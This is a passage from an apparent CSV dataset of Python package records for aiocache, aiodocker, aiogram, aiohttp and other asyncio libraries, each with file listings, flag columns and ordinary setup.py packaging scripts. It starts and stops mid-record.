    except IndexError:
        raise RuntimeError('Unable to determine version.')


with open('README.rst', 'rt', encoding='utf8') as f:
    readme = f.read()


setup(
    name='aiocache',
    version=version,
    author='Manuel Miranda',
    url='https://github.com/argaen/aiocache',
    author_email='manu.mirandad@gmail.com',
    description='multi backend asyncio cache',
    long_description=readme,
    classifiers=[
        'Programming Language :: Python',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Framework :: AsyncIO',
    ],
    packages=find_packages(),
    install_requires=None,
    extras_require={
        'redis:python_version<""3.7""': ['aioredis>=0.3.3'],
        'redis:python_version>=""3.7""': ['aioredis>=1.0.0'],
        'memcached': ['aiomcache>=0.5.2'],
        'msgpack': ['msgpack>=0.5.5'],
        'dev': [
            'asynctest>=0.11.0',
            'black;python_version>=""3.6""',
            'codecov',
            'coverage',
            'flake8',
            'ipdb',
            'marshmallow',
            'pystache',
            'pytest',
            'pytest-asyncio',
            'pytest-mock',
            'sphinx',
            'sphinx-autobuild',
            'sphinx-rtd-theme',
        ]
    }
)
",1
aiocometd-0.4.5,0,1,1,1,1,0,0,0,.pylintrc client.py constants.py exceptions.py extensions.py py.typed abc.py base.py long_polling.py registry.py websocket.py __init__.py typing.py utils.py _metadata.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt DESCRIPTION.rst make.bat Makefile advanced.rst api.rst changes.rst conf.py global.rst guide.rst index.rst install.rst quickstart.rst chat.py __init__.py LICENSE.txt MANIFEST.in PKG-INFO README.rst setup.cfg setup.py helpers.py test_client.py __init__.py test_client.py test_exceptions.py test_base.py test_long_polling.py test_registry.py test_websocket.py __init__.py test_utils.py __init__.py __init__.py,"import os
from setuptools import setup, find_packages

here = os.path.abspath(os.path.dirname(__file__))

INSTALL_REQUIRES = [
    ""aiohttp>=3.1,<4.0""
]
TESTS_REQUIRE = [
    ""asynctest>=0.12.0,<1.0.0"",
    ""coverage>=4.5,<5.0"",
    ""docker>=3.5.1"",
    ""flake8"",
    ""pylint"",
    ""mypy""
]
DOCS_REQUIRE = [
    ""Sphinx>=1.7,<2.0"",
    ""sphinxcontrib-asyncio>=0.2.0"",
    ""sphinx-autodoc-typehints""
]
EXAMPLES_REQUIRE = [
    ""aioconsole>=0.1.7,<1.0.0""
]
DEV_REQUIRE = []


def read(file_path):
    with open(os.path.join(here, file_path)) as file:
        return file.read().strip()


metadata = {}
metadata_path = os.path.join(here, ""aiocometd/_metadata.py"")
exec(read(metadata_path), metadata)


setup(
    name=metadata[""TITLE""],
    version=metadata[""VERSION""],
    description=metadata[""DESCRIPTION""],
    long_description='\n\n'.join((read('DESCRIPTION.rst'),
                                  read('docs/source/changes.rst'))),
    classifiers=[
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: Implementation :: CPython"",
        ""Framework :: AsyncIO"",
        ""License :: OSI Approved :: MIT License""
    ],
    keywords=metadata[""KEYWORDS""],
    author=metadata[""AUTHOR""],
    author_email=metadata[""AUTHOR_EMAIL""],
    url=metadata[""URL""],
    project_urls=metadata[""PROJECT_URLS""],
    license=""MIT"",
    packages=find_packages(exclude=(""tests*"", ""examples"")),
    python_requires="">=3.6.0"",
    install_requires=INSTALL_REQUIRES,
    tests_require=TESTS_REQUIRE,
    extras_require={
        ""tests"": TESTS_REQUIRE,
        ""docs"": DOCS_REQUIRE,
        ""examples"": EXAMPLES_REQUIRE,
        ""dev"": DEV_REQUIRE + TESTS_REQUIRE + DOCS_REQUIRE + EXAMPLES_REQUIRE
    },
    include_package_data=True,
    test_suite=""tests""
)
",0
aioconsole-0.5.0,0,1,1,1,1,0,0,0,apython.py command.py compat.py console.py events.py execute.py rlwrap.py server.py stream.py __init__.py __main__.py dependency_links.txt entry_points.txt PKG-INFO SOURCES.txt top_level.txt LICENSE PKG-INFO README.rst setup.cfg setup.py,"#!/usr/bin/env python3

import sys
from setuptools import setup

TESTING = any(x in sys.argv for x in [""test"", ""pytest""])

README = open(""README.rst"").read()

CLASSIFIERS = """"""\
Programming Language :: Python
Programming Language :: Python :: 3
Programming Language :: Python :: 3.7
Programming Language :: Python :: 3.8
Programming Language :: Python :: 3.9
Programming Language :: Python :: 3.10
Programming Language :: Python :: 3 :: Only
"""""".splitlines()

setup(
    name=""aioconsole"",
    version=""0.5.0"",
    packages=[""aioconsole""],
    entry_points={""console_scripts"": [""apython = aioconsole:run_apython""]},
    setup_requires=[""pytest-runner"" if TESTING else """"],
    tests_require=[""pytest"", ""pytest-asyncio"", ""pytest-cov"", ""pytest-repeat""],
    license=""GPLv3"",
    python_requires="">=3.7"",
    classifiers=CLASSIFIERS,
    description=""Asynchronous console and interfaces for asyncio"",
    long_description=README,
    author=""Vincent Michel"",
    author_email=""vxgmichel@gmail.com"",
    url=""https://github.com/vxgmichel/aioconsole"",
    download_url=""https://pypi.org/project/aioconsole/"",
)
",1
aiocontextvars-0.2.2,0,1,1,1,1,0,0,0,dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt aiocontextvars.py AUTHORS.rst CONTRIBUTING.rst authors.rst conf.py contributing.rst history.rst index.rst installation.rst make.bat Makefile readme.rst usage.rst HISTORY.rst LICENSE MANIFEST.in PKG-INFO README.rst setup.cfg setup.py test_aio.py test_var.py __init__.py,"#!/usr/bin/env python
# -*- coding: utf-8 -*-

""""""The setup script.""""""

from setuptools import setup, find_packages

with open('README.rst') as readme_file:
    readme = readme_file.read()

with open('HISTORY.rst') as history_file:
    history = history_file.read()

requirements = [
    'contextvars==2.4;python_version<""3.7""',
]

setup_requirements = [
    'pytest-runner',
]

test_requirements = [
    'pytest',
    'pytest-asyncio==0.8.0',
]

setup(
    name='aiocontextvars',
    version='0.2.2',
    description=""Asyncio support for PEP-567 contextvars backport."",
    long_description=readme + '\n\n' + history,
    author=""Fantix King"",
    author_email='fantix.king@gmail.com',
    url='https://github.com/fantix/aiocontextvars',
    py_modules=['aiocontextvars'],
    include_package_data=True,
    install_requires=requirements,
    python_requires='>=3.5',
    license=""BSD license"",
    zip_safe=False,
    keywords='aiocontextvars',
    classifiers=[
        'Development Status :: 4 - Beta',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: BSD License',
        'Natural Language :: English',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
    ],
    test_suite='tests',
    tests_require=test_requirements,
    setup_requires=setup_requirements,
)
",0
aiodataloader-0.2.1,0,1,1,1,1,0,0,0,dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt aiodataloader.py LICENSE PKG-INFO README.rst setup.cfg setup.py,"import os
import sys
from setuptools import setup, find_packages


def get_version(filename):
    import os
    import re

    here = os.path.dirname(os.path.abspath(__file__))
    with open(os.path.join(here, filename)) as f:
        version_file = f.read()
    version_match = re.search(r""^__version__ = ['\""]([^'\""]*)['\""]"",
                              version_file, re.M)
    if version_match:
        return version_match.group(1)
    raise RuntimeError(""Unable to find version string."")


version = get_version('aiodataloader.py')

tests_require = [
    'pytest>=3.6', 'pytest-cov', 'coveralls', 'mock', 'pytest-asyncio'
]

setup(
    name='aiodataloader',
    version=version,
    description='Asyncio DataLoader implementation for Python',
    long_description=open('README.rst').read(),
    url='https://github.com/syrusakbary/aiodataloader',
    download_url='https://github.com/syrusakbary/aiodataloader/releases',
    author='Syrus Akbary',
    author_email='me@syrusakbary.com',
    license='MIT',
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'Intended Audience :: Developers',
        'Topic :: Software Development :: Libraries',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'License :: OSI Approved :: MIT License',
    ],
    keywords='concurrent future deferred aiodataloader',
    py_modules=['aiodataloader'],
    extras_require={
        'test': tests_require,
    },
    tests_require=tests_require, )
",0
aiodns-3.0.0,0,1,1,1,1,0,0,0,error.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt ChangeLog LICENSE MANIFEST.in PKG-INFO README.rst setup.cfg setup.py tests.py,"# -*- coding: utf-8 -*-

import codecs
import re
import sys

from setuptools import setup


def get_version():
    return re.search(r""""""__version__\s+=\s+(?P<quote>['""])(?P<version>.+?)(?P=quote)"""""", open('aiodns/__init__.py').read()).group('version')


setup(name             = ""aiodns"",
      version          = get_version(),
      author           = ""Saúl Ibarra Corretgé"",
      author_email     = ""s@saghul.net"",
      url              = ""https://github.com/saghul/aiodns"",
      description      = ""Simple DNS resolver for asyncio"",
      license          = ""MIT"",
      long_description = codecs.open(""README.rst"", encoding=""utf-8"").read(),
      long_description_content_type = ""text/x-rst"",
      install_requires = ['pycares>=4.0.0'],
      packages         = ['aiodns'],
      platforms        = [""POSIX"", ""Microsoft Windows""],
      classifiers      = [
          ""Development Status :: 5 - Production/Stable"",
          ""Intended Audience :: Developers"",
          ""License :: OSI Approved :: MIT License"",
          ""Operating System :: POSIX"",
          ""Operating System :: Microsoft :: Windows"",
          ""Programming Language :: Python"",
          ""Programming Language :: Python :: 3"",
          ""Programming Language :: Python :: 3.6"",
          ""Programming Language :: Python :: 3.7"",
          ""Programming Language :: Python :: 3.8"",
          ""Programming Language :: Python :: 3.9""
      ]
)
",1
aiodocker-0.21.0,0,1,1,1,1,0,0,0,channel.py configs.py constants.py containers.py docker.py events.py exceptions.py execs.py images.py jsonstream.py logs.py multiplexed.py networks.py nodes.py py.typed secrets.py services.py stream.py swarm.py system.py tasks.py utils.py volumes.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGES.rst CONTRIBUTORS.txt client.rst conf.py configs.rst containers.rst events.rst exceptions.rst exec.rst images.rst index.rst log.rst make.bat Makefile secrets.rst services.rst swarm.rst tasks.rst volumes.rst environment.pickle index.doctree .buildinfo genindex.html index.html objects.inv search.html searchindex.js index.rst.txt ajax-loader.gif alabaster.css basic.css comment-bright.png comment-close.png comment.png custom.css doctools.js down-pressed.png down.png file.png jquery-3.1.0.js jquery.js minus.png plus.png pygments.css searchtools.js underscore-1.3.1.js underscore.js up-pressed.png up.png websupport.js events.py info.py stdio_stdout.py LICENSE Makefile MANIFEST.in PKG-INFO pyproject.toml README.rst RELEASE_PROCEDURE.rst base.txt ci.txt dev.txt doc.txt test.txt setup.cfg setup.py test.sh ca.pem cert.pem htpasswd key.pem registry.crt registry.key conftest.py Dockerfile docker_context.tar google-containers-pause.tar README.md app.go Dockerfile test_configs.py test_containers.py test_events.py test_execs.py test_images.py test_integration.py test_networks.py test_nodes.py test_secrets.py test_services.py test_swarm.py test_system.py test_utils.py test_volumes.py tox.ini,"#!/usr/bin/env python

import re
from pathlib import Path

from setuptools import setup


with (Path(__file__).parent / ""aiodocker"" / ""__init__.py"").open() as fp:
    try:
        version = re.findall(r'^__version__ = ""([^""]+)""\r?$', fp.read(), re.M)[0]
    except IndexError:
        raise RuntimeError(""Unable to determine version."")


long_description = open(""README.rst"").read() + open(""CHANGES.rst"").read()


requirements = [
    ""aiohttp>=3.6"",
    ""typing_extensions>=3.6.5"",
]


setup(
    name=""aiodocker"",
    version=version,
    author=""Paul Tagliamonte"",
    author_email=""paultag@debian.org"",
    long_description=long_description,
    long_description_content_type=""text/x-rst"",
    description=""Docker API client for asyncio"",
    license=""Apache 2"",
    classifiers=[
        ""Development Status :: 4 - Beta"",
        ""License :: OSI Approved :: MIT License"",
        ""Intended Audience :: Developers"",
        ""Framework :: AsyncIO"",
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7"",
        ""Topic :: Software Development"",
        ""Framework :: AsyncIO"",
    ],
    url=""https://github.com/aio-libs/aiodocker"",
    platforms=[""any""],
    packages=[""aiodocker""],
    include_package_data=True,
    python_requires="">=3.6"",
    install_requires=requirements,
)
",1
aiofile-3.8.1,0,1,1,1,0,0,0,0,aio.py py.typed utils.py version.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt LICENCE LICENCE.md MANIFEST.in PKG-INFO README.rst setup.cfg setup.py,"from importlib.machinery import SourceFileLoader
from os import path

from setuptools import setup


module = SourceFileLoader(
    ""version"", path.join(""aiofile"", ""version.py""),
).load_module()

libraries = []


setup(
    name=""aiofile"",
    version=module.__version__,
    packages=[""aiofile""],
    include_package_data=True,
    license=module.package_license,
    description=module.package_info,
    long_description=open(""README.rst"").read(),
    platforms=[""POSIX""],
    url=module.project_home,
    author=module.__author__,
    author_email=module.team_email,
    provides=[""aiofile""],
    keywords=[""aio"", ""python"", ""asyncio"", ""fileio"", ""io""],
    classifiers=[
        ""Development Status :: 5 - Production/Stable"",
        ""Environment :: Console"",
        ""Intended Audience :: Developers"",
        ""Intended Audience :: Education"",
        ""Intended Audience :: End Users/Desktop"",
        ""License :: OSI Approved :: Apache Software License"",
        ""Natural Language :: English"",
        ""Natural Language :: Russian"",
        ""Operating System :: POSIX :: Linux"",
        ""Operating System :: MacOS :: MacOS X"",
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Programming Language :: Python :: Implementation :: CPython"",
        ""Topic :: Software Development :: Libraries"",
        ""Topic :: System"",
        ""Topic :: System :: Operating System"",
    ],
    python_requires="">=3.7, <4"",
    extras_require={
        ""develop"": [
            ""aiomisc"",
            ""pytest"",
            ""pytest-cov"",
        ],
    },
    install_requires=[""caio~=0.9.0""],
)
",1
aiofiles-0.8.0,0,1,1,1,0,0,1,0,LICENSE PKG-INFO pyproject.toml README.rst setup.py base.py os.py ospath.py temptypes.py __init__.py binary.py text.py utils.py __init__.py __init__.py,"# -*- coding: utf-8 -*-
from setuptools import setup

package_dir = \
{'': 'src'}

packages = \
['aiofiles', 'aiofiles.tempfile', 'aiofiles.threadpool']

package_data = \
{'': ['*']}

setup_kwargs = {
    'name': 'aiofiles',
    'version': '0.8.0',
    'description': 'File support for asyncio.',
    'long_description': 'aiofiles: file support for asyncio\n==================================\n\n.. image:: https://img.shields.io/pypi/v/aiofiles.svg\n        :target: https://pypi.python.org/pypi/aiofiles\n\n.. image:: https://travis-ci.org/Tinche/aiofiles.svg?branch=master\n        :target: https://travis-ci.org/Tinche/aiofiles\n\n.. image:: https://codecov.io/gh/Tinche/aiofiles/branch/master/graph/badge.svg\n        :target: https://codecov.io/gh/Tinche/aiofiles\n\n.. image:: https://img.shields.io/pypi/pyversions/aiofiles.svg\n        :target: https://github.com/Tinche/aiofiles\n        :alt: Supported Python versions\n\n**aiofiles** is an Apache2 licensed library, written in Python, for handling local\ndisk files in asyncio applications.\n\nOrdinary local file IO is blocking, and cannot easily and portably made\nasynchronous. This means doing file IO may interfere with asyncio applications,\nwhich shouldn\'t block the executing thread. aiofiles helps with this by\nintroducing asynchronous versions of files that support delegating operations to\na separate thread pool.\n\n.. code-block:: python\n\n    async with aiofiles.open(\'filename\', mode=\'r\') as f:\n        contents = await f.read()\n    print(contents)\n    \'My file contents\'\n\nAsynchronous iteration is also supported.\n\n.. code-block:: python\n\n    async with aiofiles.open(\'filename\') as f:\n        async for line in f:\n            ...\n\nAsynchronous interface to tempfile module.\n\n.. code-block:: python\n\n    async with aiofiles.tempfile.TemporaryFile(\'wb\') as f:\n        await f.write(b\'Hello, World!\')\n\n\nFeatures\n--------\n\n- a file API very similar to Python\'s standard, blocking API\n- support for buffered and unbuffered binary files, and buffered text files\n- support for ``async``/``await`` (:PEP:`492`) constructs\n- async interface to tempfile module\n\n\nInstallation\n------------\n\nTo install aiofiles, simply:\n\n.. code-block:: bash\n\n    $ pip install aiofiles\n\nUsage\n-----\n\nFiles are opened using the ``aiofiles.open()`` coroutine, which in addition to\nmirroring the builtin ``open`` accepts optional ``loop`` and ``executor``\narguments. If ``loop`` is absent, the default loop will be used, as per the\nset asyncio policy. If ``executor`` is not specified, the default event loop\nexecutor will be used.\n\nIn case of success, an asynchronous file object is returned with an\nAPI identical to an ordinary file, except the following methods are coroutines\nand delegate to an executor:\n\n* ``close``\n* ``flush``\n* ``isatty``\n* ``read``\n* ``readall``\n* ``read1``\n* ``readinto``\n* ``readline``\n* ``readlines``\n* ``seek``\n* ``seekable``\n* ``tell``\n* ``truncate``\n* ``writable``\n* ``write``\n* ``writelines``\n\nIn case of failure, one of the usual exceptions will be raised.\n\nThe ``aiofiles.os`` module contains executor-enabled coroutine versions of\nseveral useful ``os`` functions that deal with files:\n\n* ``stat``\n* ``sendfile``\n* ``rename``\n* ``replace``\n* ``remove``\n* ``mkdir``\n* ``makedirs``\n* ``rmdir``\n* ``removedirs``\n* ``path.exists``\n* ``path.isfile``\n* ``path.isdir``\n* ``path.getsize``\n* ``path.getatime``\n* ``path.getctime``\n* ``path.samefile``\n* ``path.sameopenfile``\n\nTempfile\n~~~~~~~~\n\n**aiofiles.tempfile** implements the following interfaces:\n\n- TemporaryFile\n- NamedTemporaryFile\n- SpooledTemporaryFile\n- TemporaryDirectory\n\nResults return wrapped with a context manager allowing use with async with and async for.\n\n.. code-block:: python\n\n    async with aiofiles.tempfile.NamedTemporaryFile(\'wb+\') as f:\n        await f.write(b\'Line1\\n Line2\')\n        await f.seek(0)\n        async for line in f:\n            print(line)\n\n    async with aiofiles.tempfile.TemporaryDirectory() as d:\n        filename = os.path.join(d, ""file.ext"")\n\n\nWriting tests for aiofiles\n~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nReal file IO can be mocked by patching ``aiofiles.threadpool.sync_open``\nas desired. The return type also needs to be registered with the\n``aiofiles.threadpool.wrap`` dispatcher:\n\n.. code-block:: python\n\n    aiofiles.threadpool.wrap.register(mock.MagicMock)(\n        lambda *args, **kwargs: threadpool.AsyncBufferedIOBase(*args, **kwargs))\n\n    async def test_stuff():\n        data = \'data\'\n        mock_file = mock.MagicMock()\n\n        with mock.patch(\'aiofiles.threadpool.sync_open\', return_value=mock_file) as mock_open:\n            async with aiofiles.open(\'filename\', \'w\') as f:\n                await f.write(data)\n\n            mock_file.write.assert_called_once_with(data)\n\nHistory\n~~~~~~~\n0.8.0 (2021-11-27)\n``````````````````\n* aiofiles is now tested on Python 3.10.\n* Added ``aiofiles.os.replace``.\n  `#107 <https://github.com/Tinche/aiofiles/pull/107>`_\n* Added ``aiofiles.os.{makedirs, removedirs}``.\n* Added ``aiofiles.os.path.{exists, isfile, isdir, getsize, getatime, getctime, samefile, sameopenfile}``.\n  `#63 <https://github.com/Tinche/aiofiles/pull/63>`_\n* Added `suffix`, `prefix`, `dir` args to ``aiofiles.tempfile.TemporaryDirectory``.\n  `#116 <https://github.com/Tinche/aiofiles/pull/116>`_\n\n0.7.0 (2021-05-17)\n``````````````````\n- Added the ``aiofiles.tempfile`` module for async temporary files.\n  `#56 <https://github.com/Tinche/aiofiles/pull/56>`_\n- Switched to Poetry and GitHub actions.\n- Dropped 3.5 support.\n\n0.6.0 (2020-10-27)\n``````````````````\n- `aiofiles` is now tested on ppc64le.\n- Added `name` and `mode` properties to async file objects.\n  `#82 <https://github.com/Tinche/aiofiles/pull/82>`_\n- Fixed a DeprecationWarning internally.\n  `#75 <https://github.com/Tinche/aiofiles/pull/75>`_\n- Python 3.9 support and tests.\n\n0.5.0 (2020-04-12)\n``````````````````\n- Python 3.8 support. Code base modernization (using ``async/await`` instead of ``asyncio.coroutine``/``yield from``).\n- Added ``aiofiles.os.remove``, ``aiofiles.os.rename``, ``aiofiles.os.mkdir``, ``aiofiles.os.rmdir``.\n  `#62 <https://github.com/Tinche/aiofiles/pull/62>`_\n\n\n0.4.0 (2018-08-11)\n``````````````````\n- Python 3.7 support.\n- Removed Python 3.3/3.4 support. If you use these versions, stick to aiofiles 0.3.x.\n\n0.3.2 (2017-09-23)\n``````````````````\n- The LICENSE is now included in the sdist.\n  `#31 <https://github.com/Tinche/aiofiles/pull/31>`_\n\n0.3.1 (2017-03-10)\n``````````````````\n\n- Introduced a changelog.\n- ``aiofiles.os.sendfile`` will now work if the standard ``os`` module contains a ``sendfile`` function.\n\nContributing\n~~~~~~~~~~~~\nContributions are very welcome. Tests can be run with ``tox``, please ensure\nthe coverage at least stays the same before you submit a pull request.\n',
    'author': 'Tin Tvrtkovic',
    'author_email': 'tinchester@gmail.com',
    'maintainer': 'None',
    'maintainer_email': 'None',
    'url': 'None',
    'package_dir': package_dir,
    'packages': packages,
    'package_data': package_data,
    'python_requires': '>=3.6,<4.0',
}


setup(**setup_kwargs)
",1
aiogram-2.22.1,0,1,1,1,1,0,1,0,api.py base.py bot.py __init__.py files.py memory.py mongo.py redis.py rethinkdb.py __init__.py environment.py fsm.py i18n.py logging.py __init__.py __init__.py dispatcher.py builtin.py factory.py filters.py state.py __init__.py handler.py middlewares.py storage.py webhook.py __init__.py animation.py audio.py auth_widget_data.py base.py bot_command.py bot_command_scope.py callback_game.py callback_query.py chat.py chat_administrator_rights.py chat_invite_link.py chat_join_request.py chat_location.py chat_member.py chat_member_updated.py chat_permissions.py chat_photo.py chosen_inline_result.py contact.py dice.py document.py encrypted_credentials.py encrypted_passport_element.py fields.py file.py force_reply.py game.py game_high_score.py inline_keyboard.py inline_query.py inline_query_result.py input_file.py input_media.py input_message_content.py invoice.py labeled_price.py location.py login_url.py mask_position.py menu_button.py message.py message_auto_delete_timer_changed.py message_entity.py message_id.py mixins.py order_info.py passport_data.py passport_element_error.py passport_file.py photo_size.py poll.py pre_checkout_query.py proximity_alert_triggered.py reply_keyboard.py response_parameters.py sent_web_app_message.py shipping_address.py shipping_option.py shipping_query.py sticker.py sticker_set.py successful_payment.py update.py user.py user_profile_photos.py venue.py video.py video_chat_ended.py video_chat_participants_invited.py video_chat_scheduled.py video_chat_started.py video_note.py voice.py voice_chat_ended.py voice_chat_participants_invited.py voice_chat_scheduled.py voice_chat_started.py webhook_info.py web_app_data.py web_app_info.py __init__.py auth_widget.py callback_data.py deep_linking.py deprecated.py emoji.py exceptions.py executor.py helper.py json.py markdown.py mixins.py parts.py payload.py text_decorations.py web_app.py __init__.py __init__.py __main__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE PKG-INFO README.rst setup.cfg setup.py,"#!/usr/bin/env python3
import pathlib
import re
import sys

from setuptools import find_packages, setup

WORK_DIR = pathlib.Path(__file__).parent

# Check python version
MINIMAL_PY_VERSION = (3, 7)
if sys.version_info < MINIMAL_PY_VERSION:
    raise RuntimeError('aiogram works only with Python {}+'.format('.'.join(map(str, MINIMAL_PY_VERSION))))


def get_version():
    """"""
    Read version

    :return: str
    """"""
    txt = (WORK_DIR / 'aiogram' / '__init__.py').read_text('utf-8')
    try:
        return re.findall(r""^__version__ = '([^']+)'\r?$"", txt, re.M)[0]
    except IndexError:
        raise RuntimeError('Unable to determine version.')


def get_description():
    """"""
    Read full description from 'README.rst'

    :return: description
    :rtype: str
    """"""
    with open('README.rst', 'r', encoding='utf-8') as f:
        return f.read()


setup(
    name='aiogram',
    version=get_version(),
    packages=find_packages(exclude=('tests', 'tests.*', 'examples.*', 'docs',)),
    url='https://github.com/aiogram/aiogram',
    license='MIT',
    author='Alex Root Junior',
    python_requires='>=3.7',
    author_email='jroot.junior@gmail.com',
    description='Is a pretty simple and fully asynchronous framework for Telegram Bot API',
    long_description=get_description(),
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'Environment :: Console',
        'Framework :: AsyncIO',
        'Intended Audience :: Developers',
        'Intended Audience :: System Administrators',
        'License :: OSI Approved :: MIT License',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Programming Language :: Python :: 3.10',
        'Topic :: Software Development :: Libraries :: Application Frameworks',
    ],
    install_requires=[
        'aiohttp>=3.8.0,<3.9.0',
        'Babel>=2.9.1,<2.10.0',
        'certifi>=2021.10.8',
    ],
    extras_require={
        'proxy': [
            'aiohttp-socks>=0.5.3,<0.6.0',
        ],
        'fast': [
            'uvloop>=0.16.0,<0.17.0',
            'ujson>=1.35',
        ],
    },
    include_package_data=False,
)
",1
aiohttp-3.8.1,0,1,1,1,1,0,0,0,hdrs.py.hash _cparser.pxd.hash _find_header.pxd.hash _helpers.pyi.hash _helpers.pyx.hash _http_parser.pyx.hash _http_writer.pyx.hash _websocket.pyx.hash abc.py base_protocol.py client.py client_exceptions.py client_proto.py client_reqrep.py client_ws.py connector.py cookiejar.py formdata.py hdrs.py helpers.py http.py http_exceptions.py http_parser.py http_websocket.py http_writer.py locks.py log.py multipart.py payload.py payload_streamer.py py.typed pytest_plugin.py resolver.py streams.py tcp_helpers.py test_utils.py tracing.py typedefs.py web.py web_app.py web_exceptions.py web_fileresponse.py web_log.py web_middlewares.py web_protocol.py web_request.py web_response.py web_routedef.py web_runner.py web_server.py web_urldispatcher.py web_ws.py worker.py _cparser.pxd _find_header.c _find_header.h _find_header.pxd _headers.pxi _helpers.c _helpers.pyi _helpers.pyx _http_parser.c _http_parser.pyx _http_writer.c _http_writer.pyx _websocket.c _websocket.pyx __init__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGES.rst CONTRIBUTORS.txt abc.rst aiohttp-icon.svg aiohttp-plain.svg built_with.rst changes.rst client.rst client_advanced.rst client_quickstart.rst client_reference.rst conf.py contributing.rst deployment.rst essays.rst external.rst faq.rst favicon.ico glossary.rst http_request_lifecycle.rst index.rst logging.rst make.bat Makefile migration_to_2xx.rst misc.rst multipart.rst multipart_reference.rst new_router.rst old-logo.png old-logo.svg powered_by.rst spelling_wordlist.txt streams.rst structures.rst testing.rst third_party.rst tracing_reference.rst utilities.rst web.rst websocket_utilities.rst web_advanced.rst web_lowlevel.rst web_quickstart.rst web_reference.rst whats_new_1_1.rst whats_new_3_0.rst logo-adjustments.css background_tasks.py client_auth.py client_json.py client_ws.py cli_app.py curl.py fake_server.py lowlevel_srv.py server.crt server.csr server.key server_simple.py static_files.py websocket.html web_classview.py web_cookies.py web_rewrite_headers_middleware.py web_srv.py web_srv_route_deco.py web_srv_route_table.py web_ws.py __init__.py LICENSE.txt Makefile MANIFEST.in PKG-INFO pyproject.toml README.rst setup.cfg setup.py aiohttp.jpg aiohttp.png client.py fuzzingserver.json Dockerfile.aiohttp Dockerfile.autobahn fuzzingclient.json server.py test_autobahn.py conftest.py data.unknown_mime_type data.zero_bytes hello.txt.gz sample.txt test_base_protocol.py test_classbasedview.py test_client_connection.py test_client_exceptions.py test_client_fingerprint.py test_client_functional.py test_client_proto.py test_client_request.py test_client_response.py test_client_session.py test_client_ws.py test_client_ws_functional.py test_connector.py test_cookiejar.py test_flowcontrol_streams.py test_formdata.py test_helpers.py test_http_exceptions.py test_http_parser.py test_http_writer.py test_locks.py test_loop.py test_multipart.py test_multipart_helpers.py test_payload.py test_proxy.py test_proxy_functional.py test_pytest_plugin.py test_resolver.py test_route_def.py test_run_app.py test_streams.py test_tcp_helpers.py test_test_utils.py test_tracing.py test_urldispatch.py test_websocket_handshake.py test_websocket_parser.py test_websocket_writer.py test_web_app.py test_web_cli.py test_web_exceptions.py test_web_functional.py test_web_log.py test_web_middleware.py test_web_request.py test_web_request_handler.py test_web_response.py test_web_runner.py test_web_sendfile.py test_web_sendfile_functional.py test_web_server.py test_web_urldispatcher.py test_web_websocket.py test_web_websocket_functional.py test_worker.py test___all__.py .dockerignore .eslintrc.js .git ci.yaml .gitignore index.ts build_wasm.ts generate.ts llhttp.c llhttp.h CMakeLists.txt CNAME CODE_OF_CONDUCT.md Dockerfile wasm.ts http-loose-none.png http-strict-none.png LICENSE-MIT Makefile package-lock.json package.json README.md common.gypi c-headers.ts constants.ts http.ts url.ts utils.ts llhttp.gyp llhttp.ts api.c api.h http.c extra.c index.ts fuzz_parser.c md-test.ts connection.md content-length.md finish.md invalid.md lenient-headers.md method.md sample.md transfer-encoding.md uri.md connection.md content-length.md finish.md invalid.md sample.md transfer-encoding.md url.md tsconfig.json tslint.json _config.yml,"import os
import pathlib
import sys

from setuptools import Extension, setup

if sys.version_info < (3, 6):
    raise RuntimeError(""aiohttp 3.x requires Python 3.6+"")


NO_EXTENSIONS = bool(os.environ.get(""AIOHTTP_NO_EXTENSIONS""))  # type: bool
HERE = pathlib.Path(__file__).parent
IS_GIT_REPO = (HERE / "".git"").exists()


if sys.implementation.name != ""cpython"":
    NO_EXTENSIONS = True


if IS_GIT_REPO and not (HERE / ""vendor/llhttp/README.md"").exists():
    print(""Install submodules when building from git clone"", file=sys.stderr)
    print(""Hint:"", file=sys.stderr)
    print(""  git submodule update --init"", file=sys.stderr)
    sys.exit(2)


# NOTE: makefile cythonizes all Cython modules

extensions = [
    Extension(""aiohttp._websocket"", [""aiohttp/_websocket.c""]),
    Extension(
        ""aiohttp._http_parser"",
        [
            ""aiohttp/_http_parser.c"",
            ""aiohttp/_find_header.c"",
            ""vendor/llhttp/build/c/llhttp.c"",
            ""vendor/llhttp/src/native/api.c"",
            ""vendor/llhttp/src/native/http.c"",
        ],
        define_macros=[(""LLHTTP_STRICT_MODE"", 0)],
        include_dirs=[""vendor/llhttp/build""],
    ),
    Extension(""aiohttp._helpers"", [""aiohttp/_helpers.c""]),
    Extension(""aiohttp._http_writer"", [""aiohttp/_http_writer.c""]),
]


build_type = ""Pure"" if NO_EXTENSIONS else ""Accelerated""
setup_kwargs = {} if NO_EXTENSIONS else {""ext_modules"": extensions}

print(""*********************"", file=sys.stderr)
print(""* {build_type} build *"".format_map(locals()), file=sys.stderr)
